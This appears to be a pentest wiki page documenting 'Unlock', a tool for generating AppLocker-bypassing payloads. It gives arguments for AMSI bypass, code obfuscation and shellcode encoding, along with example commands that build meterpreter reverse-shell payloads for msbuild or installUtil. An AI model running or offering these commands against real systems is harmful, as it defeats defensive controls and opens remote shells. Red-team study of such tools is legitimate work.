---
description: Microsoft Applocker evasion tool
---

# Unlock applocker

Unlock aims to be an easy tool for generating payloads which can bypass MS applocker restriction. The code is heavily based on subtee work.

Link: [https://github.com/freshness79/unlock/blob/master/README.md](https://github.com/freshness79/unlock/blob/master/README.md)



### Usage

unlock.py \[-h\] \[--output FILENAME\] \[--framework FWV\] \[--payload PAYLOAD\] \[--lhost LHOST\] \[--lport LPORT\] \[--method METHOD\] \[--enaobf\] \[--encshell ENCSHELL\] \[--custom CUSTOM\] \[--x64\] \[--noamsi\]

### Arguments:

--output FILENAME Output file name without extension  
--framework FWV Framework NET version  
--payload PAYLOAD Payload in MSF syntax  
--lhost LHOST Local host for reverse shell  
--lport LPORT Local port for reverse shell  
--method METHOD Evasion method: msbuild or installUtil  
--enaobf Enable CS code obfuscation  
--encshell ENCSHELL Encode shell with: yyyymmdd, yyyymm, hostname, or domain  
--enctext TEXT Text to xorencode payload with, used with hostname or domain  
--custom CUSTOM Custom binary payload \(don't use with --payload/--lhost/--lport\)  
--x64 Set if your custom payload is x64  
--noamsi Add code to bypass AMSI

### Notes

* everything but msbuild on framework 4.0 is untested

### Examples

* python unlock.py --framework 4.0 --payload windows/x64/meterpreter/reverse\_tcp --lhost 192.168.0.1 --lport 4444 --method installUtil
* python unlock.py --framework 4.0 --payload windows/meterpreter/reverse\_tcp --lhost 192.168.0.1 --lport 4444 --method msbuild
* python unlock.py --framework 4.0 --custom shellcode.bin --x64
* python unlock.py --framework 4.0 --custom shellcode.bin --x64 --encshell yyyymm --noamsi
* python unlock.py --framework 4.0 --custom shellcode.bin --x64 --encshell hostname --enctext SECRETARY
* python unlock.py --framework 4.0 --custom shellcode.bin --x64 --encshell domain --enctext CONTOSO



